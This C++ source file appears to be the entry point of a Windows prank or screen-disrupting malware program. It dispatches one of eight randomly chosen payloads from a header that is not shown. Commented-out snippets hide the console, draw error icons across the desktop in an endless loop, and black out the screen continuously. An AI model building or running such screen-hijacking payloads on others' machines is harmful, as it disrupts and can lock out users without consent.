#include <iostream>
#include <Windows.h>
#include <wingdi.h>
#include "payloads.h"

int main(){
    //FreeConsole();
    /*MessageBox(
        NULL,
        (LPCSTR)"Text",
        (LPCSTR)"Caption",
        MB_OK | MB_ICONINFORMATION
    );*/
    //HWND hWnd = GetDesktopWindow();
    //HDC hdc = GetWindowDC(hWnd);
    /*while(1){
        DrawIcon(hdc, 0, 0, LoadIcon(NULL, IDI_ERROR));
    }*/
    /*HBRUSH brush = CreateSolidBrush(RGB(0,0,0));
    RECT res;
    GetWindowRect(hWnd, &res);

    RECT rct;
    rct.left = 0;
    rct.top = 0;
    rct.right = res.right;
    rct.bottom = res.bottom;

    while(1) {
        FillRect(hdc,&rct,brush);
        Sleep(1000/60);
    }*/

    //payloadLib::payloadClass::payload7();
    switch(payloadLib::payloadClass::generatePayload()){
    case 0:
        payloadLib::payloadClass::payload0();
        break;
    case 1:
        payloadLib::payloadClass::payload1();
        break;
    case 2:
        payloadLib::payloadClass::payload2();
        break;
    case 3:
        payloadLib::payloadClass::payload3();
        break;
    case 4:
        payloadLib::payloadClass::payload4();
        break;
    case 5:
        payloadLib::payloadClass::payload5();
        break;
    case 6:
        payloadLib::payloadClass::payload6();
        break;
    case 7:
        payloadLib::payloadClass::payload7();
        break;
    }

    return 0;
}
